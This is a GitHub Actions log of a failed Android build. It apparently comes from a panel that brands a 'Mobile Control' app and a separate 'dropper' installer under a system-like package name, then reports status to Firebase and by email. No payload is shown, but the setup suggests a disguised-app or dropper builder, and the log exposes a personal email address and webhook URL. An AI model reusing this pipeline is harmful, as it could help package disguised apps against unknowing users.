+2026-10-18T10:09:49.0066714Z     c = re.sub(r"<string name=\"app_name\">.*</string>", f"<string name=\"app_name\">{safe_app_name_xml}</string>", c)
+2026-10-18T10:09:49.0067243Z     with open(strings, "w", encoding="utf-8") as f:
+2026-10-18T10:09:49.0067563Z         f.write(c)
+2026-10-18T10:09:49.0067695Z 
+2026-10-18T10:09:49.0067828Z # 3. Update strings.xml (Dropper App)
+2026-10-18T10:09:49.0068232Z dropper_strings = "dropper/src/main/res/values/strings.xml"
+2026-10-18T10:09:49.0068709Z os.makedirs(os.path.dirname(dropper_strings), exist_ok=True)
+2026-10-18T10:09:49.0069097Z with open(dropper_strings, "w", encoding="utf-8") as f:
+2026-10-18T10:09:49.0069664Z     f.write(f"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<resources>\n    <string name=\"app_name\">{safe_app_name_xml}</string>\n</resources>")
+2026-10-18T10:09:49.0070104Z 
+2026-10-18T10:09:49.0070257Z dropper_manifest = "dropper/src/main/AndroidManifest.xml"
+2026-10-18T10:09:49.0070587Z if os.path.exists(dropper_manifest):
+2026-10-18T10:09:49.0070901Z     with open(dropper_manifest, "r", encoding="utf-8") as f:
+2026-10-18T10:09:49.0071213Z         c = f.read()
+2026-10-18T10:09:49.0071538Z     c = re.sub(r"android:label=\"[^\"]*\"", "android:label=\"@string/app_name\"", c)
+2026-10-18T10:09:49.0071946Z     with open(dropper_manifest, "w", encoding="utf-8") as f:
+2026-10-18T10:09:49.0072426Z         f.write(c)
+2026-10-18T10:09:49.0072578Z 
+2026-10-18T10:09:49.0072698Z # 4. Update package name in build.gradle.kts
+2026-10-18T10:09:49.0072995Z app_gradle = "app/build.gradle.kts"
+2026-10-18T10:09:49.0073268Z if os.path.exists(app_gradle):
+2026-10-18T10:09:49.0073599Z     with open(app_gradle, "r", encoding="utf-8") as f:
+2026-10-18T10:09:49.0073881Z         c = f.read()
+2026-10-18T10:09:49.0074213Z     c = re.sub(r"applicationId\s*=\s*\"[^\"]*\"", f"applicationId = \"{package_name}\"", c)
+2026-10-18T10:09:49.0074720Z     with open(app_gradle, "w", encoding="utf-8") as f:
+2026-10-18T10:09:49.0075009Z         f.write(c)
+2026-10-18T10:09:49.0075273Z 
+2026-10-18T10:09:49.0075550Z dropper_gradle = "dropper/build.gradle.kts"
+2026-10-18T10:09:49.0075851Z if os.path.exists(dropper_gradle):
+2026-10-18T10:09:49.0076151Z     with open(dropper_gradle, "r", encoding="utf-8") as f:
+2026-10-18T10:09:49.0076494Z         c = f.read()
+2026-10-18T10:09:49.0076844Z     c = re.sub(r"applicationId\s*=\s*\"[^\"]*\"", f"applicationId = \"{package_name}.installer\"", c)
+2026-10-18T10:09:49.0077286Z     with open(dropper_gradle, "w", encoding="utf-8") as f:
+2026-10-18T10:09:49.0077577Z         f.write(c)
+2026-10-18T10:09:49.0077701Z 
+2026-10-18T10:09:49.0077817Z # 5. Update google-services.json
+2026-10-18T10:09:49.0078080Z gs = "app/google-services.json"
+2026-10-18T10:09:49.0078329Z if os.path.exists(gs):
+2026-10-18T10:09:49.0078572Z     with open(gs, "r", encoding="utf-8") as f:
+2026-10-18T10:09:49.0078840Z         c = f.read()
+2026-10-18T10:09:49.0079154Z     c = re.sub(r"\"package_name\":\s*\"[^\"]*\"", f"\"package_name\": \"{package_name}\"", c)
+2026-10-18T10:09:49.0079546Z     with open(gs, "w", encoding="utf-8") as f:
+2026-10-18T10:09:49.0079806Z         f.write(c)
+2026-10-18T10:09:49.0079927Z 
+2026-10-18T10:09:49.0080033Z # 6. Process Custom Icon PNG if provided
+2026-10-18T10:09:49.0080310Z if icon_b64 and len(icon_b64) > 10:
+2026-10-18T10:09:49.0080561Z     try:
+2026-10-18T10:09:49.0080769Z         icon_path = "temp_icon.png"
+2026-10-18T10:09:49.0081027Z         with open(icon_path, "wb") as f:
+2026-10-18T10:09:49.0081309Z             f.write(base64.b64decode(icon_b64))
+2026-10-18T10:09:49.0081584Z         img = Image.open(icon_path)
+2026-10-18T10:09:49.0081917Z         sizes = {"mdpi": 48, "hdpi": 72, "xhdpi": 96, "xxhdpi": 144, "xxxhdpi": 192}
+2026-10-18T10:09:49.0082336Z         for target_dir in ["app/src/main/res", "dropper/src/main/res"]:
+2026-10-18T10:09:49.0082690Z             for density, size in sizes.items():
+2026-10-18T10:09:49.0083025Z                 out_dir = os.path.join(target_dir, f"mipmap-{density}")
+2026-10-18T10:09:49.0083373Z                 os.makedirs(out_dir, exist_ok=True)
+2026-10-18T10:09:49.0083751Z                 img.resize((size, size)).save(os.path.join(out_dir, "ic_launcher.png"))
+2026-10-18T10:09:49.0084233Z                 img.resize((size, size)).save(os.path.join(out_dir, "ic_launcher_round.png"))
+2026-10-18T10:09:49.0084645Z         print("Custom icon processed successfully!")
+2026-10-18T10:09:49.0084937Z     except Exception as e:
+2026-10-18T10:09:49.0085433Z         print(f"Icon decode error: {e}")
+2026-10-18T10:09:49.0085719Z : No such file or directory
+2026-10-18T10:09:49.0993198Z   File "<string>", line 20
+2026-10-18T10:09:49.0993897Z     safe_app_name_xml = xml.sax.saxutils.escape(app_name).replace(", \")
+2026-10-18T10:09:49.0994507Z                                                                   ^
+2026-10-18T10:09:49.0995295Z SyntaxError: unterminated string literal (detected at line 20)
+2026-10-18T10:09:49.1150241Z ##[error]Process completed with exit code 127.
+2026-10-18T10:09:49.1214655Z ##[group]Run python -c '
+2026-10-18T10:09:49.1215641Z [36;1mpython -c '[0m
+2026-10-18T10:09:49.1215894Z [36;1mimport requests, json, re, os[0m
+2026-10-18T10:09:49.1216191Z [36;1mfrom datetime import datetime[0m
+2026-10-18T10:09:49.1216445Z [36;1m[0m
+2026-10-18T10:09:49.1216679Z [36;1muser_id = os.environ.get("USER_ID", "user")[0m
+2026-10-18T10:09:49.1217059Z [36;1mapp_name = os.environ.get("APP_NAME", "Mobile Control")[0m
+2026-10-18T10:09:49.1217485Z [36;1mpkg_name = os.environ.get("PACKAGE_NAME", "com.system.service")[0m
+2026-10-18T10:09:49.1217910Z [36;1minput_email = os.environ.get("USER_EMAIL", "").strip()[0m
+2026-10-18T10:09:49.1218297Z [36;1mis_dropper = os.environ.get("BUILD_TYPE") == "dropper"[0m
+2026-10-18T10:09:49.1218678Z [36;1mstatus = os.environ.get("JOB_STATUS", "failure")[0m
+2026-10-18T10:09:49.1219166Z [36;1mart_name = os.environ.get("ART_NAME", "")[0m
+2026-10-18T10:09:49.1219811Z [36;1mfb_url = "https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app"[0m
+2026-10-18T10:09:49.1220718Z [36;1mwebhook_url = "https://script.google.com/macros/s/AKfycbxXY04auYkCIwzpCkhYzanzVLtzagGhbflSdctjrZee10U5T8d7FbhIa6T41hQNTm4E/exec"[0m
+2026-10-18T10:09:49.1221335Z [36;1m[0m
+2026-10-18T10:09:49.1221634Z [36;1mclean_name = re.sub(r"[^\w._\-]", "_", app_name).strip("_") or "App"[0m
+2026-10-18T10:09:49.1222031Z [36;1msuffix = "_dropper" if is_dropper else ""[0m
+2026-10-18T10:09:49.1222384Z [36;1mfname = f"{clean_name}_{user_id}{suffix}.apk"[0m
+2026-10-18T10:09:49.1222753Z [36;1martifact_name = art_name or f"{clean_name}_{user_id}-APK"[0m
+2026-10-18T10:09:49.1223082Z [36;1m[0m
+2026-10-18T10:09:49.1223281Z [36;1m# 1. Update Firebase RTDB[0m
+2026-10-18T10:09:49.1223536Z [36;1mif status == 'success':[0m
+2026-10-18T10:09:49.1223904Z [36;1m    requests.patch(f'{fb_url}/panel_users/{user_id}/build_status.json', json={[0m
+2026-10-18T10:09:49.1224314Z [36;1m        'status': '✅ Complete',[0m
+2026-10-18T10:09:49.1224584Z [36;1m        'percent': 100,[0m
+2026-10-18T10:09:49.1224896Z [36;1m        'last_log': 'Cloud build finished & ready for download!'[0m
+2026-10-18T10:09:49.1225412Z [36;1m    })[0m
+2026-10-18T10:09:49.1225733Z [36;1m    requests.patch(f'{fb_url}/panel_users/{user_id}.json', json={[0m
+2026-10-18T10:09:49.1226103Z [36;1m        'last_apk': fname,[0m
+2026-10-18T10:09:49.1226388Z [36;1m        'last_artifact_name': artifact_name[0m
+2026-10-18T10:09:49.1226696Z [36;1m    })[0m
+2026-10-18T10:09:49.1226916Z [36;1melse:[0m
+2026-10-18T10:09:49.1227255Z [36;1m    requests.patch(f'{fb_url}/panel_users/{user_id}/build_status.json', json={[0m
+2026-10-18T10:09:49.1227668Z [36;1m        'status': '❌ Build Failed',[0m
+2026-10-18T10:09:49.1227951Z [36;1m        'percent': 0,[0m
+2026-10-18T10:09:49.1228241Z [36;1m        'last_log': 'GitHub Actions build failed'[0m
+2026-10-18T10:09:49.1228543Z [36;1m    })[0m
+2026-10-18T10:09:49.1228739Z [36;1m[0m
+2026-10-18T10:09:49.1228962Z [36;1m# 2. Determine target email address[0m
+2026-10-18T10:09:49.1229250Z [36;1mtarget_email = input_email[0m
+2026-10-18T10:09:49.1229524Z [36;1mif not target_email:[0m
+2026-10-18T10:09:49.1229761Z [36;1m    try:[0m
+2026-10-18T10:09:49.1230122Z [36;1m        email_resp = requests.get(f'{fb_url}/panel_users/{user_id}/email.json', timeout=5)[0m
+2026-10-18T10:09:49.1230576Z [36;1m        if email_resp.ok and email_resp.json():[0m
+2026-10-18T10:09:49.1230934Z [36;1m            target_email = str(email_resp.json()).strip()[0m
+2026-10-18T10:09:49.1231263Z [36;1m    except Exception as e:[0m
+2026-10-18T10:09:49.1231568Z [36;1m        print(f'Firebase email lookup notice: {e}')[0m
+2026-10-18T10:09:49.1231862Z [36;1m[0m
+2026-10-18T10:09:49.1232094Z [36;1m# 3. Dispatch Automated Email Notification[0m
+2026-10-18T10:09:49.1232426Z [36;1mif target_email and '@' in target_email:[0m
+2026-10-18T10:09:49.1232793Z [36;1m    now_str = datetime.now().strftime('%d %b %Y, %I:%M %p')[0m
+2026-10-18T10:09:49.1233257Z [36;1m    if status == 'success':[0m
+2026-10-18T10:09:49.1233623Z [36;1m        subj = f'✅ [Ready] APK Build Complete: {app_name} ({user_id})'[0m
+2026-10-18T10:09:49.1233986Z [36;1m        html_body = f'''[0m
+2026-10-18T10:09:49.1234242Z [36;1m        <!DOCTYPE html>[0m
+2026-10-18T10:09:49.1234485Z [36;1m        <html>[0m
+2026-10-18T10:09:49.1235289Z [36;1m        <body style=\"margin: 0; padding: 24px 12px; background-color: #050507; font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif;\">[0m
+2026-10-18T10:09:49.1236528Z [36;1m            <div style=\"max-width: 560px; margin: 0 auto; background: #121217; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.8);\">[0m
+2026-10-18T10:09:49.1237675Z [36;1m                <div style=\"padding: 28px 24px; background: linear-gradient(180deg, rgba(255,255,255,0.04) 0%, rgba(255,255,255,0) 100%); border-bottom: 1px solid rgba(255,255,255,0.08); text-align: center;\">[0m
+2026-10-18T10:09:49.1239134Z [36;1m                    <div style=\"display: inline-block; padding: 4px 12px; background: rgba(48,209,88,0.15); border: 1px solid rgba(48,209,88,0.4); border-radius: 20px; font-size: 11px; font-weight: 700; color: #30d158; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px;\">[0m
+2026-10-18T10:09:49.1240154Z [36;1m                        BUILD READY[0m
+2026-10-18T10:09:49.1240435Z [36;1m                    </div>[0m
+2026-10-18T10:09:49.1240823Z [36;1m                    <h1 style=\"margin: 0; font-size: 22px; font-weight: 800; color: #ffffff;\">[0m
+2026-10-18T10:09:49.1241254Z [36;1m                        APK Compilation Finished[0m
+2026-10-18T10:09:49.1241551Z [36;1m                    </h1>[0m
+2026-10-18T10:09:49.1241902Z [36;1m                    <p style=\"margin: 8px 0 0 0; font-size: 14px; color: #a1a1a6;\">[0m
+2026-10-18T10:09:49.1242443Z [36;1m                        Your custom APK package <strong>{app_name}</strong> is ready for installation.[0m
+2026-10-18T10:09:49.1242875Z [36;1m                    </p>[0m
+2026-10-18T10:09:49.1243118Z [36;1m                </div>[0m
+2026-10-18T10:09:49.1243387Z [36;1m                <div style=\"padding: 24px;\">[0m
+2026-10-18T10:09:49.1243962Z [36;1m                    <div style=\"background: rgba(255,255,255,0.03); border-radius: 14px; border: 1px solid rgba(255,255,255,0.05); overflow: hidden;\">[0m
+2026-10-18T10:09:49.1244607Z [36;1m                        <table style=\"width: 100%; border-collapse: collapse;\">[0m
+2026-10-18T10:09:49.1244971Z [36;1m                            <tr>[0m
+2026-10-18T10:09:49.1245745Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #86868b; border-bottom: 1px solid rgba(255,255,255,0.06);\">App Name</td>[0m
+2026-10-18T10:09:49.1246714Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #f5f5f7; font-weight: 600; text-align: right; border-bottom: 1px solid rgba(255,255,255,0.06);\">{app_name}</td>[0m
+2026-10-18T10:09:49.1247394Z [36;1m                            </tr>[0m
+2026-10-18T10:09:49.1247660Z [36;1m                            <tr>[0m
+2026-10-18T10:09:49.1248203Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #86868b; border-bottom: 1px solid rgba(255,255,255,0.06);\">Package Name</td>[0m
+2026-10-18T10:09:49.1249127Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #f5f5f7; font-weight: 600; text-align: right; border-bottom: 1px solid rgba(255,255,255,0.06);\">{pkg_name}</td>[0m
+2026-10-18T10:09:49.1249790Z [36;1m                            </tr>[0m
+2026-10-18T10:09:49.1250049Z [36;1m                            <tr>[0m
+2026-10-18T10:09:49.1250587Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #86868b; border-bottom: 1px solid rgba(255,255,255,0.06);\">Build Type</td>[0m
+2026-10-18T10:09:49.1251723Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #f5f5f7; font-weight: 600; text-align: right; border-bottom: 1px solid rgba(255,255,255,0.06);\">{'Dropper Installer' if is_dropper else 'Main Application'}</td>[0m
+2026-10-18T10:09:49.1252538Z [36;1m                            </tr>[0m
+2026-10-18T10:09:49.1252808Z [36;1m                            <tr>[0m
+2026-10-18T10:09:49.1253238Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #86868b;\">Completed At</td>[0m
+2026-10-18T10:09:49.1253925Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #f5f5f7; font-weight: 600; text-align: right;\">{now_str}</td>[0m
+2026-10-18T10:09:49.1254457Z [36;1m                            </tr>[0m
+2026-10-18T10:09:49.1254718Z [36;1m                        </table>[0m
+2026-10-18T10:09:49.1255043Z [36;1m                    </div>[0m
+2026-10-18T10:09:49.1255713Z [36;1m                    <div style=\"text-align: center; margin-top: 28px; margin-bottom: 10px;\">[0m
+2026-10-18T10:09:49.1257098Z [36;1m                        <a href=\"https://mobile-control-pro.web.app/builder.html?uid={user_id}\" target=\"_blank\" style=\"background: linear-gradient(135deg, #0071e3 0%, #005bb5 100%); color: #ffffff; text-decoration: none; padding: 13px 32px; font-size: 14px; font-weight: 700; border-radius: 980px; display: inline-block; box-shadow: 0 4px 20px rgba(0, 113, 227, 0.4);\">[0m
+2026-10-18T10:09:49.1258392Z [36;1m                            📥 Open Builder & Download APK &rarr;[0m
+2026-10-18T10:09:49.1258717Z [36;1m                        </a>[0m
+2026-10-18T10:09:49.1258967Z [36;1m                    </div>[0m
+2026-10-18T10:09:49.1259213Z [36;1m                </div>[0m
+2026-10-18T10:09:49.1259467Z [36;1m            </div>[0m
+2026-10-18T10:09:49.1259707Z [36;1m        </body>[0m
+2026-10-18T10:09:49.1259924Z [36;1m        </html>[0m
+2026-10-18T10:09:49.1260133Z [36;1m        '''[0m
+2026-10-18T10:09:49.1260343Z [36;1m    else:[0m
+2026-10-18T10:09:49.1260638Z [36;1m        subj = f'❌ [Failed] APK Build Alert: {app_name} ({user_id})'[0m
+2026-10-18T10:09:49.1260981Z [36;1m        html_body = f'''[0m
+2026-10-18T10:09:49.1261663Z [36;1m        <!DOCTYPE html>[0m
+2026-10-18T10:09:49.1261914Z [36;1m        <html>[0m
+2026-10-18T10:09:49.1262492Z [36;1m        <body style=\"margin: 0; padding: 24px 12px; background-color: #050507; font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif;\">[0m
+2026-10-18T10:09:49.1263453Z [36;1m            <div style=\"max-width: 560px; margin: 0 auto; background: #121217; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); padding: 24px; text-align: center;\">[0m
+2026-10-18T10:09:49.1264217Z [36;1m                <h2 style=\"color: #ff453a; margin-top: 0;\">APK Build Failed</h2>[0m
+2026-10-18T10:09:49.1264860Z [36;1m                <p style=\"color: #a1a1a6;\">The automated build for <strong>{app_name}</strong> encountered an error during compilation.</p>[0m
+2026-10-18T10:09:49.1266334Z [36;1m                <a href=\"https://mobile-control-pro.web.app/builder.html?uid={user_id}\" style=\"background: #ff453a; color: #fff; text-decoration: none; padding: 10px 24px; border-radius: 980px; font-weight: bold; display: inline-block; margin-top: 16px;\">Check Logs & Retry</a>[0m
+2026-10-18T10:09:49.1267338Z [36;1m            </div>[0m
+2026-10-18T10:09:49.1267579Z [36;1m        </body>[0m
+2026-10-18T10:09:49.1267810Z [36;1m        </html>[0m
+2026-10-18T10:09:49.1268038Z [36;1m        '''[0m
+2026-10-18T10:09:49.1268255Z [36;1m[0m
+2026-10-18T10:09:49.1268494Z [36;1m    # Channel 1: Google Apps Script Webhook[0m
+2026-10-18T10:09:49.1268792Z [36;1m    try:[0m
+2026-10-18T10:09:49.1269006Z [36;1m        mail_payload = {[0m
+2026-10-18T10:09:49.1269276Z [36;1m            'action': 'send_email',[0m
+2026-10-18T10:09:49.1269578Z [36;1m            'to': target_email,[0m
+2026-10-18T10:09:49.1270006Z [36;1m            'subject': subj,[0m
+2026-10-18T10:09:49.1270284Z [36;1m            'htmlBody': html_body[0m
+2026-10-18T10:09:49.1270543Z [36;1m        }[0m
+2026-10-18T10:09:49.1270859Z [36;1m        resp = requests.post(webhook_url, json=mail_payload, timeout=10)[0m
+2026-10-18T10:09:49.1271340Z [36;1m        print(f'Email webhook sent to {target_email}: HTTP {resp.status_code}')[0m
+2026-10-18T10:09:49.1271728Z [36;1m    except Exception as err:[0m
+2026-10-18T10:09:49.1272040Z [36;1m        print(f'Email webhook notice (non-fatal): {err}')[0m
+2026-10-18T10:09:49.1272351Z [36;1m[0m
+2026-10-18T10:09:49.1272604Z [36;1m    # Channel 2: FormSubmit Cloud Gateway Fallback[0m
+2026-10-18T10:09:49.1272897Z [36;1m    try:[0m
+2026-10-18T10:09:49.1273110Z [36;1m        form_payload = {[0m
+2026-10-18T10:09:49.1273363Z [36;1m            '_subject': subj,[0m
+2026-10-18T10:09:49.1273684Z [36;1m            '_template': 'box',[0m
+2026-10-18T10:09:49.1273945Z [36;1m            '_captcha': 'false',[0m
+2026-10-18T10:09:49.1274227Z [36;1m            'Alert': 'APK Build Complete',[0m
+2026-10-18T10:09:49.1274510Z [36;1m            'App_Name': app_name,[0m
+2026-10-18T10:09:49.1274774Z [36;1m            'Package': pkg_name,[0m
+2026-10-18T10:09:49.1275241Z [36;1m            'Build_Type': 'Dropper' if is_dropper else 'Main App',[0m
+2026-10-18T10:09:49.1275607Z [36;1m            'User_UID': user_id,[0m
+2026-10-18T10:09:49.1276036Z [36;1m            'Download_URL': f'https://mobile-control-pro.web.app/builder.html?uid={user_id}'[0m
+2026-10-18T10:09:49.1276443Z [36;1m        }[0m
+2026-10-18T10:09:49.1276659Z [36;1m        f_headers = {[0m
+2026-10-18T10:09:49.1276932Z [36;1m            'Content-Type': 'application/json',[0m
+2026-10-18T10:09:49.1277244Z [36;1m            'Accept': 'application/json',[0m
+2026-10-18T10:09:49.1277616Z [36;1m            'Referer': 'https://mobile-control-pro.web.app',[0m
+2026-10-18T10:09:49.1278016Z [36;1m            'Origin': 'https://mobile-control-pro.web.app'[0m
+2026-10-18T10:09:49.1278329Z [36;1m        }[0m
+2026-10-18T10:09:49.1278791Z [36;1m        f_resp = requests.post(f'https://formsubmit.co/ajax/{target_email}', json=form_payload, headers=f_headers, timeout=10)[0m
+2026-10-18T10:09:49.1279435Z [36;1m        print(f'Email cloud gateway sent to {target_email}: HTTP {f_resp.status_code}')[0m
+2026-10-18T10:09:49.1279843Z [36;1m    except Exception as err2:[0m
+2026-10-18T10:09:49.1280142Z [36;1m        print(f'Email cloud gateway notice: {err2}')[0m
+2026-10-18T10:09:49.1280429Z [36;1m"[0m
+2026-10-18T10:09:49.1321097Z shell: /usr/bin/bash -e {0}
+2026-10-18T10:09:49.1321380Z env:
+2026-10-18T10:09:49.1321719Z   JAVA_HOME: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-18T10:09:49.1322199Z   JAVA_HOME_17_X64: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-18T10:09:49.1322596Z   APP_NAME: Mobile Control
+2026-10-18T10:09:49.1322828Z   USER_ID: master01
+2026-10-18T10:09:49.1323063Z   PACKAGE_NAME: com.system.service.booster
+2026-10-18T10:09:49.1323365Z   USER_EMAIL: ohedulislam577@gmail.com
+2026-10-18T10:09:49.1323618Z   BUILD_TYPE: standard
+2026-10-18T10:09:49.1323839Z   JOB_STATUS: failure
+2026-10-18T10:09:49.1324044Z   ART_NAME: 
+2026-10-18T10:09:49.1324236Z ##[endgroup]
+2026-10-18T10:09:49.1383409Z /home/runner/work/_temp/66445e1f-aa87-4585-ae8f-9ff241e227a2.sh: line 52: syntax error near unexpected token `('
+2026-10-18T10:09:49.1387093Z ##[error]Process completed with exit code 2.
+2026-10-18T10:09:49.1501496Z Post job cleanup.
+2026-10-18T10:09:49.2844427Z (node:2267) [DEP0040] DeprecationWarning: The `punycode` module is deprecated. Please use a userland alternative instead.
+2026-10-18T10:09:49.2846276Z (Use `node --trace-deprecation ...` to show where the warning was created)
+2026-10-18T10:09:49.3098218Z Post job cleanup.
+2026-10-18T10:09:49.3987188Z [command]/usr/bin/git version
+2026-10-18T10:09:49.4031464Z git version 2.55.0
+2026-10-18T10:09:49.4073580Z Temporarily overriding HOME='/home/runner/work/_temp/e0dcec30-f0a6-4c22-8daa-21f619334260' before making global git config changes
+2026-10-18T10:09:49.4075388Z Adding repository directory to the temporary git global config as a safe directory
+2026-10-18T10:09:49.4080007Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/ando-projet/ando-projet
+2026-10-18T10:09:49.4129927Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
+2026-10-18T10:09:49.4174786Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
+2026-10-18T10:09:49.4395389Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
+2026-10-18T10:09:49.4420524Z http.https://github.com/.extraheader
+2026-10-18T10:09:49.4431064Z [command]/usr/bin/git config --local --unset-all http.https://github.com/.extraheader
+2026-10-18T10:09:49.4463862Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
+2026-10-18T10:09:49.4678040Z [command]/usr/bin/git config --local --name-only --get-regexp ^includeIf\.gitdir:
+2026-10-18T10:09:49.4709234Z [command]/usr/bin/git submodule foreach --recursive git config --local --show-origin --name-only --get-regexp remote.origin.url
+2026-10-18T10:09:49.5060246Z Cleaning up orphan processes
+2026-10-18T10:09:49.5275791Z ##[warning]Node.js 20 is deprecated. The following actions target Node.js 20 but are being forced to run on Node.js 24: actions/checkout@v4, actions/setup-java@v4. For more information see: https://github.blog/changelog/2025-09-19-deprecation-of-node-20-on-github-actions-runners/
